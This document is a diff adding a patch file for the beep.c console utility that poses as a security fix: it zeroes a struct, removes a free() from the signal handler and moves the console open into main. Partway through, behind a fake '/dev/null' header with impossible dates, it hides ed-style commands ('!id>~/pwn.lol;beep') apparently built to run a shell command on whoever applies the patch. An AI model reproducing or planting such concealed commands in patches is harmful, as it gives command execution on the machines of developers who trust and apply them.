@@ -1,0 +1,112 @@
+--- a/beep.c	2018-13-27 12:53:21.000000000 +0100
++++ b/beep.c	2018-13-27 16:53:43.000000000 +0100
+@@ -109,6 +109,7 @@
+      /* BEEP_TYPE_EVDEV */
+      struct input_event e;
+ 
++     memset(&e, 0, sizeof(e));
+      e.type = EV_SND;
+      e.code = SND_TONE;
+      e.value = freq;
+@@ -124,10 +125,6 @@
+ /* If we get interrupted, it would be nice to not leave the speaker beeping in
+    perpetuity. */
+ void handle_signal(int signum) {
+-
+-  if(console_device)
+-    free(console_device);
+-
+   switch(signum) {
+   case SIGINT:
+   case SIGTERM:
+@@ -257,7 +254,7 @@
+       result->verbose = 1;
+       break;
+     case 'e' : /* also --device */
+-      console_device = strdup(optarg);
++      console_device = optarg;
+       break;
+     case 'h' : /* notice that this is also --help */
+     default :
+@@ -276,26 +273,6 @@
+ 	"%d delay after) @ %.2f Hz\n",
+ 	parms.reps, parms.length, parms.delay, parms.end_delay, parms.freq);
+ 
+-  /* try to snag the console */
+-  if(console_device)
+-    console_fd = open(console_device, O_WRONLY);
+-  else
+-    if((console_fd = open("/dev/tty0", O_WRONLY)) == -1)
+-      console_fd = open("/dev/vc/0", O_WRONLY);
+-
+-  if(console_fd == -1) {
+-    fprintf(stderr, "Could not open %s for writing\n",
+-      console_device != NULL ? console_device : "/dev/tty0 or /dev/vc/0");
+-    printf("\a");  /* Output the only beep we can, in an effort to fall back on usefulness */
+-    perror("open");
+-    exit(1);
+-  }
+-
+-  if (ioctl(console_fd, EVIOCGSND(0)) != -1)
+-    console_type = BEEP_TYPE_EVDEV;
+-  else
+-    console_type = BEEP_TYPE_CONSOLE;
+-  
+   /* Beep */
+   for (i = 0; i < parms.reps; i++) {                    /* start beep */
+     do_beep(parms.freq);
+--- /dev/null	2018-13-37 13:37:37.000000000 +0100
++++ b/beep.c	2018-13-37 13:38:38.000000000 +0100
+1337a
+1,112d
+!id>~/pwn.lol;beep # 13-21 12:53:21.000000000 +0100
+.
+--- a/beep.c	2018-13-27 12:53:21.000000000 +0100
++++ b/beep.c	2018-13-27 16:53:43.000000000 +0100
+@@ -305,8 +282,6 @@
+     if(parms.end_delay || (i+1 < parms.reps))
+        usleep(1000*parms.delay);                        /* wait...    */
+   }                                                     /* repeat.    */
+-
+-  close(console_fd);
+ }
+ 
+ 
+@@ -328,6 +303,26 @@
+   signal(SIGTERM, handle_signal);
+   parse_command_line(argc, argv, parms);
+ 
++  /* try to snag the console */
++  if(console_device)
++    console_fd = open(console_device, O_WRONLY);
++  else
++    if((console_fd = open("/dev/tty0", O_WRONLY)) == -1)
++      console_fd = open("/dev/vc/0", O_WRONLY);
++
++  if(console_fd == -1) {
++    fprintf(stderr, "Could not open %s for writing\n",
++      console_device != NULL ? console_device : "/dev/tty0 or /dev/vc/0");
++    printf("\a");  /* Output the only beep we can, in an effort to fall back on usefulness */
++    perror("open");
++    exit(1);
++  }
++
++  if (ioctl(console_fd, EVIOCGSND(0)) != -1)
++    console_type = BEEP_TYPE_EVDEV;
++  else
++    console_type = BEEP_TYPE_CONSOLE;
++
+   /* this outermost while loop handles the possibility that -n/--new has been
+      used, i.e. that we have multiple beeps specified. Each iteration will
+      play, then free() one parms instance. */
+@@ -365,8 +360,8 @@
+     parms = next;
+   }
+ 
+-  if(console_device)
+-    free(console_device);
++  close(console_fd);
++  console_fd = -1;
+ 
+   return EXIT_SUCCESS;
+ }
